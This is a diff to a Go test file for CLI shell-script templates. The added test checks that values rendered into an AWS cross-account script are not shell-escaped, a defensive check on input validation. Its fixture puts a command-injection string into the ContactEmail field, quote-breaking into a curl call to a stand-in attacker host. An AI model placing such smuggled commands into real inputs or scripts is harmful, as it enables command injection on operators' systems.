@@ -200,8 +200,30 @@ func TestCLITemplatesAutoRegister(t *testing.T) {
 	}
 }
 
+// TestCLITemplatesShellMetacharsPassThrough confirms that text/template does
+// not shell-escape interpolated values. This is intentional: the templates are
+// designed to be downloaded and inspected by an operator, not auto-executed.
+// The renderer (handler_federation.go) is responsible for validating fields
+// before execution so that user-controlled values cannot inject shell commands.
+func TestCLITemplatesShellMetacharsPassThrough(t *testing.T) {
+	// Craft a ContactEmail that contains shell metacharacters. If the template
+	// engine were to shell-escape this, the output would differ from the input.
+	data := baseData()
+	data.ContactEmail = `ops@example.com"; curl https://evil.example.com; echo "`
+
+	rendered := renderCLITemplate(t, "templates/aws-cross-account-cli.sh.tmpl", data)
+
+	// The raw metacharacter string must appear verbatim in the rendered output,
+	// confirming that text/template does NOT escape it. The test documents the
+	// invariant that the renderer MUST validate ContactEmail (and similar fields)
+	// before calling template.Execute.
+	if !strings.Contains(rendered, data.ContactEmail) {
+		t.Errorf("expected raw ContactEmail (including metacharacters) to appear verbatim in rendered template; renderer must validate this field before execution")
+	}
+}
+
 // TestCLITemplatesOmitRegisterBlock proves the auto-register section is gated
-// on CUDlyAPIURL — when it's empty, the block disappears entirely.
+// on CUDlyAPIURL -- when it's empty, the block disappears entirely.
 func TestCLITemplatesOmitRegisterBlock(t *testing.T) {
 	data := baseData()
 	data.CUDlyAPIURL = ""
